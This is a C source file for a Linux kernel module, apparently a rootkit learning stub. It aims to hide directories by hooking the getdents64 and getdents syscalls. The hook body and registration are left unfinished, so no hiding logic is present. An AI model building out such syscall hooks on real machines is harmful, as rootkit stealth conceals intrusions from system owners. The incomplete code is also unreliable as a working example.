/**
 * This module aims to implement base logic for hiding directory hooking linked syscalls (getdents64 & getdents)
 * 
 * Sources : 
 * https://github.com/xcellerator/linux_kernel_hacking/blob/master/3_RootkitTechniques/3.4_hiding_directories/rootkit.c
 * https://syscalls64.paolostivanin.com/
 * 
 * Notes : 
 * This module focus only on kernel version > 4.17.0 for the the test using new pt_regs structs.
 * 
 * @author Yekuuun
 */

#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>

#define MODNAME "HIDE_DIR"

/**
 * Helper functions. => hooking.
 */
#include "../lib/hook/ftrace_helper.h"

MODULE_AUTHOR("Yekuuun");
MODULE_DESCRIPTION("Hiding directories.");
MODULE_LICENSE("GPL");
MODULE_VERSION("0.0.1");

/**
 * Hook function ptr declarations.
 */
static asmlinkage unsigned long (*orig_getdents64)(const struct pt_regs *regs);
static asmlinkage unsigned long (*orig_getdents)(const struct pt_regs *regs);

/**
 * Main hooking technique for getdents_64
 */
static asmlinkage hook_getdents_64(const struct pt_regs *regs){
    long err;

    /**
     * rdi -> int fd
     * rsi -> struct linux_dirent64 __user
     * rdx -> unsigned int count
    */
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;
}

static int __init hide_lkm_init(void) {
#if !defined(CONFIG_X86_64) || (LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0))
    pr_err("[!] Unsupported kernel version or architecture.\n");
    return -EINVAL;
#endif

    return 0;
}

static void __exit hide_lkm_exit(void){
    
}

module_init(hide_lkm_init);
module_exit(hide_lkm_exit);